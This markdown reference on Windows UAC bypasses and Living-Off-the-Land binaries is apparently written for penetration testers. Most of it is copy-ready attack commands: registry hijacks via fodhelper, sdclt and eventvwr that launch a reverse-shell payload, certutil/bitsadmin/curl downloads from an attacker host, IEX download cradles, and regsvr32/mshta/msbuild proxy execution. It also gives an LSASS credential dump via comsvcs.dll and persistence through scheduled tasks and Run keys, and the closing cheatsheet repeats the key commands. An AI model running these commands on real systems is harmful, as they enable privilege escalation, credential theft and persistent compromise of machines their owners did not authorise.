# UAC Bypass & LOLBAS

Reference for User Account Control (UAC) bypasses (Medium → High integrity for an admin-in-token user) and Living-Off-the-Land Binaries And Scripts (LOLBAS) — signed, built-in Windows binaries abused for download, execution, and defense evasion. Companion to `windows-privesc-methodology.md`.

---

## 1. UAC Background

UAC splits an administrator's logon into two tokens: a **filtered** (Medium IL) token used by default and a **full** (High IL) token used only after consent. A UAC *bypass* is **not** a privilege escalation across users — it elevates an account that is *already* a local admin from Medium to High IL without a consent prompt. Confirm you're in the right situation first:

```cmd
whoami /groups | findstr /i "S-1-16-8192"     :: S-1-16-8192 = Medium IL
whoami /groups | findstr /i "S-1-5-32-544"    :: Administrators present (in token)
net localgroup administrators                  :: your user listed?
:: Check UAC config
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```
`ConsentPromptBehaviorAdmin = 0` → no prompt (easy). `= 5` (default) → auto-elevate bypasses still work via trusted/auto-elevating binaries.

---

## 2. Auto-Elevate + Registry Hijack Bypasses

Many signed Microsoft binaries **auto-elevate** (manifest `autoElevate=true`) without prompting. They read certain user-writable registry keys; planting a command there yields High-IL execution. These are the staples (mostly fileless):

### 2.1 fodhelper (classic, very reliable)
```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c start cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
:: cleanup:
reg delete "HKCU\Software\Classes\ms-settings" /f
```

### 2.2 computerdefaults (same ms-settings hijack)
```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Windows\Temp\rev.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
computerdefaults.exe
```

### 2.3 sdclt (App Paths / IsolatedCommand hijack)
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "C:\Windows\Temp\rev.exe" /f
sdclt.exe
:: variant:
reg add "HKCU\Software\Classes\exefile\shell\runas\command\isolatedCommand" /d "C:\Windows\Temp\rev.exe" /f
sdclt.exe /KickOffElev
```

### 2.4 eventvwr (mscfile hijack — older but in many labs)
```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\Windows\Temp\rev.exe" /f
eventvwr.exe
reg delete "HKCU\Software\Classes\mscfile" /f
```

### 2.5 slui / changepk, WSReset, DiskCleanup
Other auto-elevate hosts abused via similar protocol/registry hijacks — `slui.exe` (exefile), `WSReset.exe` (AppX), `cleanmgr`/scheduled `SilentCleanup` task (env-var/COM hijack). Pick whichever is unpatched on the build.

### 2.6 Tooling
```powershell
# UACME — 70+ bypass methods, pick one by build number
.\Akagi64.exe <method_number> C:\Windows\Temp\rev.exe
# PowerShell modules
. .\Invoke-PrivescCheck.ps1     # reports UAC settings
# metasploit: exploit/windows/local/bypassuac_fodhelper, ..._sdclt, ..._eventvwr
```

> Patched methods get retired each build; **UACME** is the living catalog mapping method → Windows build. Check the build (`winver` / `[Environment]::OSVersion`) and choose a method that still works.

---

## 3. Token-Based "Bypass" (admin already)

If you hold an admin token at High IL already, you don't need a UAC bypass — but to spawn SYSTEM from High-IL admin:
```cmd
PsExec64.exe -accepteula -s -i cmd          :: -s = SYSTEM
sc create x binPath= "cmd /c ..." & sc start x
:: Or token magic in PowerShell (Get-System) / Mimikatz token::elevate
```

---

## 4. LOLBAS — Living Off the Land

LOLBAS are signed Microsoft binaries/scripts already on the box, abused so you avoid dropping custom tooling (better OPSEC, bypasses some app-control). Categories: **download**, **execute**, **encode/decode**, **dump**, **bypass UAC/AppLocker**. The canonical index is https://lolbas-project.github.io/.

### 4.1 Download a file
```cmd
certutil -urlcache -split -f http://IP/x.exe C:\Windows\Temp\x.exe
certutil -encode / -decode ...                       :: also base64
bitsadmin /transfer j /download http://IP/x.exe C:\Windows\Temp\x.exe
curl http://IP/x.exe -o C:\Windows\Temp\x.exe        :: curl.exe ships in Win10 1803+
```
```powershell
iwr http://IP/x.exe -OutFile C:\Windows\Temp\x.exe
(New-Object Net.WebClient).DownloadFile('http://IP/x.exe','C:\Windows\Temp\x.exe')
```

### 4.2 Execute / proxy execution (AppLocker/defense bypass)
```cmd
:: Run a remote/local DLL or scriptlet via trusted binaries
regsvr32 /s /n /u /i:http://IP/x.sct scrobj.dll          :: Squiblydoo
rundll32 C:\path\evil.dll,EntryPoint
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();...   :: JS exec
mshta http://IP/x.hta
mshta vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run(""calc"")"))
installutil /logfile= /LogToConsole=false /U evil.exe    :: .NET InstallUtil
msbuild evil.xml                                          :: inline-task C# exec (no compiler needed)
wmic process call create "cmd /c ..."
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c <command>"
:: Trusted folder bypass / signed proxy:
%windir%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj
```
```powershell
:: PowerShell download-cradle execution
IEX (New-Object Net.WebClient).DownloadString('http://IP/p.ps1')
:: .NET reflective load
[Reflection.Assembly]::Load((iwr http://IP/x.exe -UseBasicParsing).Content)
```

### 4.3 Credential / process dump via LOLBAS
```cmd
:: LSASS dump with signed comsvcs.dll (no mimikatz binary on disk)
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\l.dmp full
:: Task Manager right-click "Create dump file" (GUI) is also LOLBAS-class
:: WerFault / dumping via Windows Error Reporting
```

### 4.4 Persistence / lateral via LOLBAS
```cmd
schtasks /create /tn upd /tr "C:\Windows\Temp\x.exe" /sc onlogon /ru SYSTEM
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v u /d "C:\Windows\Temp\x.exe" /f
:: WMI event subscription, BITS jobs, etc.
```

> AppLocker/WDAC bypass: prefer LOLBAS in default-allowed paths (`C:\Windows\`, `C:\Program Files\`) and signed binaries. `msbuild`, `installutil`, `regsvr32`, `mshta`, `rundll32` are the classics; check the LOLBAS site for current "execute" entries that still bypass the target's policy.

---

## 5. Cheatsheet

```cmd
:: CONFIRM UAC SITUATION
whoami /groups | findstr "S-1-16-8192 S-1-5-32-544"

:: FODHELPER BYPASS
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd /c start cmd" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe & reg delete "HKCU\Software\Classes\ms-settings" /f

:: UACME (pick method by build)
Akagi64.exe <n> C:\Windows\Temp\rev.exe

:: LOLBAS DOWNLOAD
certutil -urlcache -split -f http://IP/x.exe x.exe
curl http://IP/x.exe -o x.exe

:: LOLBAS EXEC
regsvr32 /s /n /u /i:http://IP/x.sct scrobj.dll
mshta http://IP/x.hta
msbuild evil.csproj

:: LSASS DUMP (LOLBAS)
rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\Temp\l.dmp full
```

---

## References

- LOLBAS Project — https://lolbas-project.github.io/
- UACME (catalog of bypasses) — https://github.com/hfiref0x/UACME
- HackTricks – UAC Bypass — https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control
- HackTricks – LOLBAS / AppLocker bypass — https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs
- itm4n – fodhelper/sdclt writeups — https://itm4n.github.io/
- atomic red team T1548.002 (UAC bypass) — https://www.atomicredteam.io/atomic-red-team/atomics/T1548.002
